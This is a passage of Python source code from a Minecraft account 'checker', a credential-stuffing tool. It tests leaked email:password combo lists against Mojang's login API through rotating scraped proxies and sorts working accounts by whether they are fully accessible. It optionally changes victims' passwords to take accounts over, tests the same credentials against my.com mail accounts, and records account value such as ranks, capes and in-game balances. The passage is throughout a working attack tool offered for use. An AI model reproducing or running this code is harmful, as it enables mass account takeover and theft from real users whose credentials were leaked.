                tasks = []
                for alt in alts:
                    proxy = random.choice(proxies)
                    tasks.append(executor.submit(
                        check_ban, alt['email'], alt['password'], proxy['address'], proxy['port'], proxies_type,
                        output))
                for result in as_completed(tasks):
                    print(result.result())
                windll.kernel32.SetConsoleTitleW(
                    f'MinecraftChecker-{self.version} | Done Checking | BanChecker')
                if Checker.RPC.discordrpc and self.rpcwork == 1:
                    RPC.update(details="Done Bancheck", large_image="minecraft")
                print('Finished!\n')
                mode = input('Press ENTER to exit')
                exit()

        elif mode == "3":
            import requests
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0"}
            system('cls')
            print(t)
            urls = [
                    'https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all']
            urls.append('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all')
            urls.append('https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all')
            urls.append('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt')
            urls.append('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt')
            urls.append('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt')
            urls.append('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt')
            urls.append('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt')
            urls.append('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt')
            urls.append('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt')
            urls.append('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt')
            urls.append('https://multiproxy.org/txt_all/proxy.txt')
            urls.append('http://rootjazz.com/proxies/proxies.txt')
            urls.append('http://ab57.ru/downloads/proxyold.txt')
            urls.append('https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt')
            urls.append('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt')
            urls.append('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt')
            urls.append('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt')
            downloadfilename2 = input('File to save proxies eg proxies.txt:')
            if Checker.RPC.discordrpc and self.rpcwork == 1:
                RPC.update(details="Scraping Proxies.....!!", large_image="minecraft")
            windll.kernel32.SetConsoleTitleW(
                f'MinecraftChecker-{self.version} | Scraping Proxies | MinecraftProxy')
            print(f'{Fore.CYAN}Scraping Proxies....!!')
            print(f'{Fore.CYAN}Maybe This Take Some Time!!!')
            import requests
            proxies = []
            scrapedproxies = []
            done = []
            while True:
                for url in urls:
                    try:
                        r = requests.get(url, timeout=30, headers=headers)
                    except Exception as error:
                        print(error)
                        continue
                lol = r.text.split('\n')
                urls.remove(url)
                for line in lol:
                    proxies.append(line)
                scraped = len(proxies)
                print(f'{Fore.GREEN}[+] Scraped {scraped} Proxies')
                if Checker.RPC.discordrpc and self.rpcwork == 1:
                    RPC.update(details="Scraped :" + str(scraped), large_image="minecraft")
                for proxy in proxies:
                    if proxy.count(':') == 1:
                        if len(proxy) < 30:
                            done.append(proxy+'\n')
                if len(urls) > 0:
                    continue
                else:
                    print(f'{Fore.CYAN}Done scraping\n')
                    break
            windll.kernel32.SetConsoleTitleW(
                f'MinecraftChecker-{self.version} | Done Scraping | MinecraftProxy')
            if Checker.RPC.discordrpc and self.rpcwork == 1:
                RPC.update(details="Done Scraping", large_image="minecraft")
            print(f'Proxies scraped: {len(done)}')
            print(f'Removing duplicates...')
            output_file: str = f'{downloadfilename2}'
            open(output_file, 'w', encoding='latin-1').writelines(set(done))
            afterremove = open(output_file, 'r', encoding='u8', errors='ignore').read().split('\n')
            beforeremove = len(done)
            removed = beforeremove - len(afterremove)
            print(f'{Fore.CYAN}Done\n')
            mode = input('Press ENTER to Back')
            system('cls')
            Main()

        elif mode == "6":
            exit()
            system(cls)

        elif mode == "5":
            def MailCheck():
                if Checker.RPC.discordrpc and self.rpcwork == 1:
                    RPC.update(details="MailCheck", large_image="minecraft")
                for account in self.accounts:
                    if account.count(':') == 1:
                        email, password = account.split(':')
                        while True:
                            try:
                                ans = scraper.get(
                                    url=f'https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login={email}&Password={password}',
                                    headers=self.mailheaders, timeout=3).text
                                if 'Ok=1' in ans:
                                    counter.mailaccessss += 1
                                    counter.untilsleep += 1
                                    open(f'{savepath}/MA.txt', 'a',
                                         encoding='u8').write(f'{account}\n')
                                    print(
                                        f'{Fore.LIGHTGREEN_EX}[MA] - {account}')
                                    break
                                elif 'Ok=0' in ans:
                                    counter.bad += 1
                                    counter.untilsleep += 1
                                    open(f'{savepath}/BAD.txt', 'a',
                                         encoding='u8').write(f'{account}\n')
                                    print(
                                        f'{Fore.LIGHTRED_EX}[BAD] - {account}')
                                    break
                                else:
                                    counter.bad += 1
                                    counter.untilsleep += 1
                                    open(f'{savepath}/BAD.txt', 'a',
                                         encoding='u8').write(f'{account}\n')
                                    print(
                                        f'{Fore.LIGHTRED_EX}[BAD] - {account}')
                                    break
                            except Exception as f:
                                print(f)

            def donothing():
                faj = 0

            if __name__ == '__main__':
                windll.kernel32.SetConsoleTitleW(
                    f'Minecraftchecker V{self.version} | Module: MailAccess')
                if Checker.RPC.discordrpc and self.rpcwork == 1:
                    RPC.update(details="MailAccess", large_image="minecraft")
                system('cls')
                print(t)
                mailfile = input(
                    f'{Fore.CYAN}[MailAccess] Accounts file eg combos.txt: ')
                self.combolist = open(
                    mailfile, 'r', encoding='u8', errors='ignore').read().split('\n')
                self.accounts = [
                    x for x in self.combolist if x != '' and ':' in x]
                print(f'{Fore.GREEN}Imported: {len(self.accounts)} Combo lines')
                unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
                savepath = f'Results/MailAccess-{unix}'
                if not path.exists('Results'):
                    mkdir('Results')
                if not path.exists(savepath):
                    mkdir(savepath)
                threadsss = int(input('Threads: '))
                Thread(target=self.cpmm, daemon=True).start()
                Thread(target=self.mailtitle, daemon=True).start()
                with ThreadPool(threadsss) as pool:
                    res = pool.imap_unordered(donothing, MailCheck())
                    pool.close()
                    pool.join()
                system('cls')
                print(t)
                print(f'{Fore.MAGENTA}Done Checking\n')
                print(f'{Fore.CYAN}-- MA (Mail Access): {counter.mailaccessss}')
                print(f'{Fore.CYAN}-- BAD: {counter.bad}')
                if Checker.RPC.discordrpc and self.rpcwork == 1:
                    RPC.update(details="Mail Access: " + str(counter.mailaccessss), large_image="minecraft")
                input(f'{Fore.LIGHTCYAN_EX}Press ENTER to Back')
                Main()

        elif mode == "1":
            system('cls')
            print(t)

        else:
            sleep(1)
            print("Wrong number!")
            system('cls')
            Main()

        while True:
            read_files = glob('combos/*.txt')
            if read_files == '[]':
                print(
                    f'{Fore.YELLOW}No Combos files found in directory please put your combos in there and try again')
                input(f'{Fore.CYAN}Press ENTER when you have done that')
                continue
            self.combolist = []
            for file in read_files:
                combolistt = open(file, 'r', encoding='u8',
                                  errors='ignore').read().split('\n')
                for line in combolistt:
                    self.combolist.append(f'{line}')
            break
        checkname = input(f'\n{Fore.MAGENTA}Name for the check: ')
        print(f'{Fore.CYAN}Importing combos.....\n')
        sleep(1)
        if Checker.Proxy.proxy == True:
            while True:
                read_files = glob('proxies/*.txt')
                if read_files == '[]':
                    print(
                        f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
                    input(f'{Fore.CYAN}Press ENTER when you have done that')
                    continue
                self.proxylist = []
                for file in read_files:
                    proxylistt = open(file, 'r', encoding='u8',
                                      errors='ignore').read().split('\n')
                    for line in proxylistt:
                        self.proxylist.append(f'{line}')
                break
        print(f'{Fore.GREEN}Imported {len(self.combolist)} Combo lines\n')
        if Checker.Proxy.proxy == True:
            if not self.proxyapi:
                    sleep(2)
                    withoutremoved = len(self.proxylist)
                    print(f'{Fore.CYAN}Importing proxies....\n')
                    self.proxylist = list(
                        set([x.strip() for x in self.proxylist if ":" in x and x != '']))
                    removed = withoutremoved - len(self.proxylist)
                    print( f'{Fore.GREEN}Imported {len(self.proxylist)} Proxies line\n')
            else:
                sleep(2)
                print(f'{Fore.CYAN}Importing proxies from api...\n')
                self.proxylist = requests.get(
                    Checker.Proxy.proxy_api_link).text.split('\n')
                print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines\n')
        print(f'{Fore.MAGENTA}[Minecraftchecker] Starting Threads...\n')
        windll.kernel32.SetConsoleTitleW(
            f'MinecraftChecker-{self.version} | Getting ready!')
        self.dic2torary = open('config\og-name.txt', 'a+', errors='ignore').read().split('\n')
        unix = str(strftime('%d-%m-%Y %H-%M-%S'))
        self.folder = f'Results/Normal Mode-({checkname}){unix}'
        if not path.exists('Results'):
            mkdir('Results')
        if not path.exists(self.folder):
            mkdir(self.folder)
            if Checker.Level.hypixel or Checker.Rank.hypixel_rank or Checker.Uhc.uhc or Checker.Skywars.skywars or Checker.Bedwars.bedwars:
                mkdir(self.folder + '/Hypixel')
            if Checker.Level.hypixel:
                mkdir(self.folder + '/Hypixel/Level')
            if Checker.Rank.hypixel_rank:
                mkdir(self.folder + '/Hypixel/Rank')
            if Checker.Uhc.uhc:
                mkdir(self.folder + '/Hypixel/UHC')
            if Checker.Skywars.skywars:
                mkdir(self.folder + '/Hypixel/SkyWars')
            if Checker.Bedwars.bedwars:
                mkdir(self.folder + '/Hypixel/Bedwars')
            mkdir(self.folder + '/Hypixel/SkyBlock')
            if Checker.Cape.labymod or Checker.Cape.minecon or Checker.Cape.optifine:
                mkdir(self.folder + '/Cape')
            if Checker.Rank.hivemc_rank:
                mkdir(self.folder + '/HiveMC')
            if Checker.Rank.veltpvp_rank:
                mkdir(self.folder + '/VeltPVP')
            if Checker.Rank.wynncraft_rank:
                mkdir(self.folder + '/Wynncraft')
            if Checker.Rank.mineplex_rank or Checker.Level.mineplex:
                mkdir(self.folder + '/Mineplex')
            mkdir(self.folder + '/Usernames')

        self.accounts = [x for x in self.combolist if x != '' and ':' in x]
        Thread(target=self.cpm_counter, daemon=False).start()
        Thread(target=self.advancedcounters, daemon=False).start()
        pool = ThreadPool(Checker.threads)
        import time
        self.start_time = time.time()
        Thread(target=self.title, daemon=False).start()
        system('cls')
        print(t)
        try:
            print(f'{Fore.CYAN}- Combo Lines: {len(self.combolist)}')
            print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
        except:
            self.proxylist = []
        pool.map(func=self.usecheck, iterable=self.accounts)
        pool.close()
        pool.join()
        print(f'{Fore.CYAN}Press ENTER to exit')
        exit()
    def usecheck(self, line):
        if line.count(':') == 1:
            email, password = line.split(':')
            checked_num = 0
            answer = 'Invalid username or password'
            while True:
                if checked_num != Checker.retries:
                    if not self.Paused:
                        answer = self.checkmc(email, password)
                        if 'Invalid username or password' in str(answer):
                            checked_num += 1
                        elif 'Request blocked' in str(answer) or 'Client sent too many requests too fast' in str(
                                answer):
                            sleep(5)
                        else:
                            break
                else:
                    break
            if 'Invalid username or password' in str(answer):
                if not self.Paused:
                    Counter.bad += 1
                    self.baddd.append(line)
                    if Checker.printbadd:
                        self.prints(f'{Fore.RED}[BAD] - {line}')
                    if Checker.save_bad:
                        open(f'{self.folder}/Bad.txt', 'a', encoding='u8').write(f'{line}\n')
            else:
                try:
                    uuid = answer['availableProfiles'][0]['id']
                    username = answer['availableProfiles'][0]['name']
                    vaildalt = True
                    token = answer['accessToken']
                    if vaildalt:
                        sfacheck = self.securedcheck(token=token)
                        if sfacheck == '[]':
                            self.sfa = True
                            Counter.sfa += 1
                            Counter.sf += 1
                            Counter.hits += 1
                            self.prints(f'{Fore.LIGHTGREEN_EX}[SFA] - {line} Username: {username}{Fore.RESET}')
                            if Checker.PasswordChanger.passwordchanger:
                                self.prints(f'{Fore.MAGENTA}[PassChanger] Changing password')
                                try:
                                    self.changepass(token=token, line=line)
                                    self.prints(f'{Fore.MAGENTA}[PassChanger] Password of {line} to {Checker.PasswordChanger.newpassword}')
                                    open(f'{self.folder}/Changed_SFA.txt', 'a', encoding='u8').write(f'{email}:{Checker.PasswordChanger.newpassword}\n')
                                except Exception as rip:
                                    self.prints(
                                        f'{Fore.RED}Error changing password {rip}')
                            open(f'{self.folder}/SFA.txt', 'a', encoding='u8').write(f'{line}\n')
                            open(f'{self.folder}/Hits.txt', 'a', encoding='u8').write(f'{line}\n')
                            if len(username) <= 3:
                                open(f'{self.folder}/Usernames/3letter.txt', 'a', encoding='u8').write(f'{line} | {username}\n')
                            elif len(username) == 4:
                                open(f'{self.folder}/Usernames/4letter.txt', 'a', encoding='u8').write(f'{line} | {username}\n')
                            else:
                                open(f'{self.folder}/Usernames/5+.txt', 'a', encoding='u8').write(f'{line} | {username}\n')
                        else:
                            self.nfa = True
                            Counter.nfa += 1
                            Counter.hits += 1
                            Counter.nf += 1
                            self.prints(f'{Fore.LIGHTGREEN_EX}[NFA] - {line} Username: {username}{Fore.RESET}')
                            open(f'{self.folder}/NFA.txt', 'a', encoding='u8').write(f'{line}\n')
                            open(f'{self.folder}/Hits.txt', 'a', encoding='u8').write(f'{line}\n')
                            if len(username) <= 3:
                                open(f'{self.folder}/Usernames/3letter.txt', 'a', encoding='u8').write(f'{line} | {username}\n')
                            elif len(username) == 4:
                                open(f'{self.folder}/Usernames/4letter.txt', 'a', encoding='u8').write(f'{line} | {username}\n')
                            else:
                                open(f'{self.folder}/Usernames/5+.txt', 'a', encoding='u8').write(f'{line} | {username}\n')
                    if vaildalt:
                        import re
                        url = f'https://sky.lea.moe/stats/Juvix01'
                        response = requests.get(
                            url=url, headers=self.mailheaders).text
                        if not 'No user with the name' in response:
                            if not 'Player has no SkyBlock profiles.' in response:
                                self.prints(
                                    f'{Fore.CYAN}[Capture] Skyblock - {line}')
                                if 'Unique Pets' in response:
                                    test1 = re.search("Unique Pets:(.*)", response).group(1)
                                    pets = re.search('value ">(.*)', test1).group(1).split('<')
                                    petnum = pets[0]
                                else:
                                    petnum = 'Hidden'
                                if 'Bank Account' in response:
                                    anothertest = re.search('class="stat-name">Bank Account:(.*)', response).group(1).split('</span><span class="stat-value">')
                                    lol = anothertest[1].split('</span></div>')
                                    bankbal = lol[0]
                                else:
                                    bankbal = 'Hidden'
                                bruh = re.search('class="stat-name">Purse:(.*)', response).group(
                                    1).split('</span><span class="stat-value">')
                                kek = bruh[1].split('<')
                                pursebal = kek[0]
                                loll = re.search('class="stat-name">Joined: (.*)', response).group(
                                    1).split('</span><span class="stat-value">')
                                ok = loll[1].split('</span></span></div>')
                                joinedsky = ok[0]
                                open(f'{self.folder}/Hypixel/SkyBlock/Stats.txt', 'a', encoding='u8').write(
                                    f'{line} | Bank: {bankbal} | Wallet: {pursebal} | Pets: {petnum} | Started: {joinedsky}\n')

                    if vaildalt:
                        with ThreadPoolExecutor() as exe:
                            hypixel = exe.submit(self.hypixel, uuid, line)
                            mineplex = exe.submit(
                                self.mineplex, username, line)
                            hiverank = exe.submit(self.hivemc, uuid, line)
                            wynncraft = exe.submit(self.wynncraft, uuid, line)
                            veltpvp = exe.submit(self.veltpvp, username, line)
                            mailaccess = exe.submit(
                                self.mailaccesz, email, password)
                            minecon = exe.submit(
                                self.mojang, uuid, line, username)
                            optifine = exe.submit(
                                self.optifine, username, line)
                            labycape = exe.submit(
                                self.labymod, uuid, line, username)
                            hypixel = hypixel.result()
                            mineplex = mineplex.result()
                            wynncraft = wynncraft.result()
                            hiverank = hiverank.result()
                            veltpvp = veltpvp.result()
                            mailaccess = mailaccess.result()
                            minecon = minecon.result()
                            optifine = optifine.result()
                            labycape = labycape.result()

                    if len(username) <= 3 or len(username) in self.dictorary:
                        open(f'{self.folder}/OGName.txt', 'a', encoding='u8').write(f'[{username}]{line}\n')
                        Counter.ogname += 1
                        Counter.pog += 1
                except Exception as error:
                    if self.debug:
                        print(f'{Fore.RED}Error: {error}')

    def checkmc(self, user, passw):
        try:
            payload = ({
                'agent': {
                    'name': 'Minecraft',
                    'version': 1
                },
                'username': user,
                'password': passw,
                'requestUser': 'true'
            })
            if not Checker.Proxy.proxy:
                while True:
                    try:
                        answer = scraper.post(url=self.mcurl, json=payload, headers=self.jsonheaders,
                                              timeout=Checker.timeout).json()
                        break
                    except (SocketError, SSLError, MaxRetryError, JSONDecodeError):
                        sleep(3)
                        continue
            else:
                while True:
                    try:
                        answer = scraper.post(url=self.mcurl, proxies=self.proxies(),
                                              json=payload, headers=self.jsonheaders, timeout=Checker.timeout).json()
                        break
                    except (SocketError, SSLError, MaxRetryError, ProxyError, JSONDecodeError):
                        continue
            answered = answer
        except Exception as e:
            if self.debug:
                self.prints(f'CheckMC: \n{e}')
            answered = 'errorMessage'
        return answered

    def urlscraper(self):
        import requests
        urls = []
        proxies = []
        scrapedproxies = []
        tim = int(input('Timeout: '))
        urlss = open('urls.txt', 'r', encoding='u8',
                     errors='ignore').read().split('\n')
        improvedurls = [x for x in urlss if x != '' and 'http' in x]
        for line in improvedurls:
            urls.append(line)
        while True:
            currentnumber = open(
                'Scraped.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
            beforescrape = (len(scrapedproxies))
            for url in urls:
                try:
                    r = requests.get(url, timeout=tim)
                except:
                    print(f'{Fore.RED}[-] Couldn\'t connect {url}')
                    urls.remove(url)
                    continue
            lol = r.text.split('\n')
            urls.remove(url)
            for line in lol:
                proxies.append(line)
                scrapedproxies = [x for x in proxies if x !=
                                  '' and ':' in x and 'a' not in x and 'b' not in x and 'c' not in x and 'd' not in x and 'e' not in x and 'f' not in x and 'g' not in x and 'h' not in x and 't' not in x]
                scraped = len(scrapedproxies) - beforescrape
            print(f'{Fore.GREEN}[+] Scraped {scraped} Proxies from {url}')
            for proxy in scrapedproxies:
                open(f'Scraped.txt', 'a', encoding='u8').write(f'{proxy}\n')
            if len(urls) > 0:
                continue
            else:
                print('Done scraping')
                break

    def checkproxy(self, user, passw, proxy):
        try:
            payload = ({
                'agent': {
                    'name': 'Minecraft',
                    'version': 1
                },
                'username': user,
                'password': passw,
                'requestUser': 'true'
            })
            while True:
                try:
                    answer = scraper.post(url=self.mcurl, proxies=proxy,
                                          json=payload, headers=self.jsonheaders, timeout=Checker.timeout).json()
                    break
                except (SocketError, SSLError, MaxRetryError, ProxyError, JSONDecodeError):
                    continue
            answered = answer
        except Exception as e:
            if self.debug:
                self.prints(f'CheckMC: \n{e}')
            answered = 'errorMessage'
        return answered

    def securedcheck(self, token):
        headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
        try:
            if not Checker.Proxy.proxy:
                while True:
                    try:
                        lol = scraper.get(url=self.secureurl,
                                          headers=headers).text
                        break
                    except (SocketError, SSLError, MaxRetryError, JSONDecodeError):
                        sleep(3)
                        continue
            else:
                while True:
                    try:
                        lol = scraper.get(
                            url=self.secureurl, headers=headers, proxies=self.proxies()).text
                        break
                    except (SocketError, SSLError, MaxRetryError, ProxyError, JSONDecodeError):
                        continue
            answer = lol
        except Exception as e:
            if self.debug:
                self.prints(f'Error SFA: \n{e}')
            answer = 'NFAAAA'
        return answer

    def securedcheck1(self, token):
        headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
        try:
            while True:
                try:
                    lol = scraper.get(url=self.secureurl,
                                      headers=headers).text
                    break
                except (SocketError, SSLError, MaxRetryError, JSONDecodeError):
                    sleep(3)
                    continue
            answer = lol
        except Exception as e:
            if self.debug:
                self.prints(f'Error SFA: \n{e}')
            answer = 'NFAAAA'
        return answer

    def changepass(self, token, line):
        email, password = line.split(':')
        headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
        json = ({
            'oldPassword': password,
            'password': Checker.PasswordChanger.newpassword
        })
        try:
            while True:
                try:
                    lol = scraper.put(url='https://api.mojang.com/users/password',
                                      json=json, headers=headers).text
                    break
                except (SocketError, SSLError, MaxRetryError, JSONDecodeError):
                    sleep(6)
                    continue
            answer = lol
        except Exception as e:
            self.prints(f'Error Pass changer: \n{e}')
            answer = 'Error'
        return answer

    def title(self):
        while True:
            if Checker.profit.profit:
                estimatedhits = round(Counter.guess)
                Total = len(self.accounts)
                windll.kernel32.SetConsoleTitleW(
                    f"MinecraftChecker-{self.version}"
                    f" | Checked: {Counter.bad + Counter.hits}/{Total} ({Counter.checkedpercent}%)"
                    f" | Hits: {Counter.hits})"
                    f" | Bad: {Counter.bad})"
                    f' | CPM: {Counter.cpm}'
                    f' | Checking for: {self.Timeused()}')
                if Checker.RPC.discordrpc and self.rpcwork == 1:
                    RPC.update(details="Checked: " + str(Counter.bad + Counter.hits) + '/' +str(Total) + " Hits: " + str(Counter.hits) +" CPM: " + str(Counter.cpm), state=" elapsed: " + str(self.Timeused()) , large_image="minecraft")

            else:
                estimatedhits = round(Counter.guess)
                Total = len(self.accounts)
                windll.kernel32.SetConsoleTitleW(
                    f"Minecraftchecker-{self.version}"
                    f" | Checked: {Counter.bad + Counter.hits}/{Total} ({Counter.bad + Counter.hits / {Total} * 100}%)"
                    f" | Hits: {Counter.hits})"
                    f" | Bad: {Counter.bad} ({Counter.failedpercent}%)"
                    f' | CPM: {Counter.cpm}'
                    f' | Checking for: {self.Timeused()}')
                if Checker.RPC.discordrpc and self.rpcwork == 1:
                    RPC.update(details="Checked: " + str(Counter.bad + Counter.hits) + '/' + str(Total) + " Hits: " + str(
                    Counter.hits) + " CPM: " + str(Counter.cpm), state=" elapsed: " + str(self.Timeused()),
                           large_image="minecraft")

    def Timeused(self):
        import time
        return strftime("%H:%M:%S", gmtime(time.time() - self.start_time))

    def proxytitle(self):
        while True:
            windll.kernel32.SetConsoleTitleW(
                f"Minecraftchecker-{self.version}"
                f" | Bad: {Counter.invalid}"
                f" | Good: {Counter.mojangunbanned}"
                f" | CPM: {Counter.proxycpm}")

    def mailtitle(self):
        while True:
            windll.kernel32.SetConsoleTitleW(
                f"Minecraftchecker-{self.version}"
                f" | Bad: {counter.bad}"
                f" | MFA: {counter.mailaccessss}"
                f" | CPM: {counter.cpm}")

    def proxies(self):
        proxy = choice(self.proxylist)
        if proxy.count(':') == 3:
            spl = proxy.split(':')
            proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
        else:
            proxy = proxy
        if self.proxy_type.lower() == 'http' or self.proxy_type.lower() == 'https':
            proxy_form = {
                'http': f"http://{proxy}",
                'https': f"https://{proxy}"
            }
        else:
            proxy_form = {
                'http': f"{self.proxy_type}://{proxy}",
                'https': f"{self.proxy_type}://{proxy}"
            }
        return proxy_form

    def optifine(self, user, combo):
        cape = False
        if Checker.Cape.optifine:
            try:
                optifine = requests.get(
                    url=f'http://s.optifine.net/capes/{user}.png').text
                if 'Not found' not in optifine:
                    cape = True
            except Exception as e:
                if self.debug:
                    self.prints(
                        f'{Fore.LIGHTRED_EX}Error Optifine:\n{e}{Fore.WHITE}')
            if cape:
                Counter.optifine += 1
                Counter.of += 1
                self.prints(
                    f'{Fore.CYAN}[Capture] - OF Cape | {combo}  {user}')
                open(f'{self.folder}/Cape/OptifineCape.txt', 'a', encoding='u8').write(
                    f'{combo} | Username: {user}\n')
        return cape

    def mojang(self, uuid, combo, user):
        cape = False
        if Checker.Cape.minecon:
            try:
                mine = requests.get(
                    url=f'https://api.ashcon.app/mojang/v2/user/{uuid}').text
                if mine.__contains__('"cape"'):
                    cape = True
            except Exception as e:
                if self.debug:
                    self.prints(
                        f'{Fore.LIGHTRED_EX}Error MojangCape:\n{e}{Fore.WHITE}')
            if cape:
                Counter.mojang += 1
                Counter.mj += 1
                self.prints(
                    f'{Fore.CYAN}[Capture] - MJ Cape | {combo} Username: {user}{Fore.RESET}')
                open(f'{self.folder}/Cape/MineconCape.txt', 'a', encoding='u8').write(
                    f'{combo} | Username: {user}\n')
        return cape

    def labymod(self, uuid, combo, user):
        cape = False
        if Checker.Cape.labymod:
            link = f'http://capes.labymod.net/capes/{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}'
            try:
                laby = requests.get(url=link).text
                if not str(laby).__contains__('Not Found'):
                    cape = True
            except Exception as e:
                if self.debug:
                    self.prints(
                        f'{Fore.LIGHTRED_EX}Error Labymod:\n{e}{Fore.WHITE}')
            if cape:
                Counter.lbm += 1
                Counter.labymod += 1
                self.prints(
                    f'{Fore.CYAN}[Capture] - LBM Cape | {combo} Username: {user}')
                open(f'{self.folder}/Cape/LabymodCape.txt', 'a', encoding='u8').write(
                    f'{combo} | Username: {user}\n')
        return cape

    def hivemc(self, uuid, combo):
        rank = False
        if Checker.Rank.hivemc_rank:
            try:
                response = requests.get(
                    url=f'https://www.hivemc.com/player/{uuid}').text
                match = self.rankhv.search(response).group(1)
                if match != 'Regular':
                    rank = match
            except AttributeError:
                rank = False
            except Exception as e:
                if self.debug:
                    self.prints(
                        f'{Fore.LIGHTRED_EX}Error HiveMC:\n{e}{Fore.WHITE}')
            if rank:
                open(f'{self.folder}/HiveMC/Ranked.txt', 'a', encoding='u8').write(
                    f'[{str(rank)}]{combo}  \n')
                Counter.hivemcrank += 1
                Counter.hr1 += 1
                self.prints(
                    f'{Fore.CYAN}[Capture] - Hive Ranked | [{str(rank)}] {combo}{Fore.RESET}')
            return rank

    def veltpvp(self, username, combo):
        rank = False
        if Checker.Rank.veltpvp_rank:
            try:
                link = requests.get(
                    url=f'https://www.veltpvp.com/u/{username}', headers=self.mailheaders).text
                if 'Not Found' not in link:
                    rank = self.veltrank.search(link).group(1)
                    if rank == 'Standard' or rank == 'Default':
                        rank = False
                    else:
                        rank = rank
            except AttributeError:
                rank = False
            except Exception as e:
                if self.debug:
                    self.prints(f'{Fore.LIGHTRED_EX}Error Veltpvp:\n{e}')
            if rank:
                open(f'{self.folder}/VeltPVP/Ranked.txt', 'a',
                     encoding='u8').write(f'{combo} | Rank: {rank}\n')
                Counter.vr += 1
                Counter.veltrank += 1
                self.prints(
                    f'{Fore.CYAN}[Capture] - Velt Ranked | [{rank}] {combo} Username: {username}{Fore.RESET}')
        return rank

    def wynncraft(self, username, combo):
        rankk = [False, False]
        if Checker.Rank.wynncraft_rank:
            try:
                answer = requests.get(
                    url=f'https://api.wynncraft.com/v2/player/{username}/stats').json()
            except Exception as e:
                if self.debug:
                    self.prints(
                        f'{Fore.LIGHTRED_EX}Wynncraft API Error: \n{e}{Fore.WHITE}')
            if '400' not in str(answer):
                rank = str(answer['rank'])
                if rank != 'Player':
                    if rank != 'False':
                        Counter.wynncraft += 1
                        self.prints(
                            f'{Fore.CYAN}[Capture] -  Wynncraft Ranked [{rankk[0]}] {combo}{Fore.RESET}')
                        open(f'{self.folder}/wynncraft/Ranked.txt', 'a', encoding='u8').write(
                            f'[{rankk[0]}] {combo}  \n')
                else:
                    rankk[1] = True
        return rankk

    def hypixel(self, uuid, combo):
        both = [False, False, False, False, False, False]
        if self.hypr or self.hypl or Checker.Uhc.uhc or Checker.Bedwars.bedwars or Checker.Skywars:
            try:
                answer = get(
                    url=f'https://api.slothpixel.me/api/players/{uuid}').json()
                if 'Failed to get player uuid' not in str(answer):
                    rank = str(answer['rank'])
                    if rank.__contains__('_PLUS'):
                        rank = rank.replace('_PLUS', '+')
                    level = int(answer["level"])
                    coins = int(answer["stats"]['UHC']['coins'])
                    coin = int(answer["stats"]['SkyWars']['coins'])
                    bwcoins = int(answer["stats"]['BedWars']['coins'])
                    nolog = str(answer['username'])
                    if nolog == 'None':
                        both[2] = True
                    else:
                        both[0] = str(rank)
                        both[1] = int(round(level))
                        both[3] = int(coins)
                        both[4] = int(coin)
                        both[5] = int(bwcoins)

                else:
                    both[2] = True
            except Exception as e:
                if self.debug:
                    self.prints(
                        f'{Fore.LIGHTRED_EX}Hypixel API Error: \n{e}{Fore.WHITE}')
            if not both[2]:
                if both[3] >= self.uhcminc:
                    if Checker.Uhc.uhc:
                        Counter.uhccoin += 1
                        open(f'{self.folder}/Hypixel/UHC/UHCCoins.txt', 'a',
                             encoding='u8').write(f'[{both[3]}]{combo} \n')
                if both[4] >= Checker.Skywars.scoins:
                    if Checker.Skywars.skywars:
                        Counter.swcoin += 1
                        open(f'{self.folder}/Hypixel/SkyWars/SWCoins.txt',
                             'a', encoding='u8').write(f'[{both[4]}]{combo} \n')
                if both[5] >= Checker.Bedwars.bwlevel:
                    if Checker.Bedwars.bedwars:
                        Counter.bwcoin += 1
                        open(f'{self.folder}/Hypixel/BedWars/BWCoins.txt',
                             'a', encoding='u8').write(f'[{both[5]}]{combo} \n')
            if not both[2]:
                if both[0] != 'None':
                    rank = both[0]
                    if (str(rank)) != 'False':
                        Counter.hypixelrank += 1
                        Counter.hr += 1
                        self.prints(
                            f'{Fore.CYAN}[Capture] - Hypixel Ranked | [{both[0]}] {combo}{Fore.RESET}')
                        open(f'{self.folder}/Hypixel/Rank/Ranked.txt', 'a', encoding='u8').write(
                            f'[{both[0]}] {combo}  \n')
                else:
                    both[0] = False
                if both[1] >= 1 and both[1] < 10:
                    Counter.one += 1
                    open(f'{self.folder}/Hypixel/Level/1+.txt', 'a', encoding='u8').write(
                        f'[{str(both[1])}]{combo} \n')
                elif both[1] >= 10 and both[1] < 25:
                    Counter.eleven += 1
                    open(f'{self.folder}/Hypixel/Level/10+.txt', 'a', encoding='u8').write(
                        f'[{str(both[1])}]{combo} \n')
                elif both[1] >= 25:
                    Counter.twenty += 1
                    self.prints(
                        f'{Fore.CYAN}[Capture] - Hypixel 25+ | {combo}{Fore.RESET}')
                    open(f'{self.folder}/Hypixel/Level/25+.txt', 'a', encoding='u8').write(
                        f'[{str(both[1])}]{combo} \n')
            else:
                self.prints(
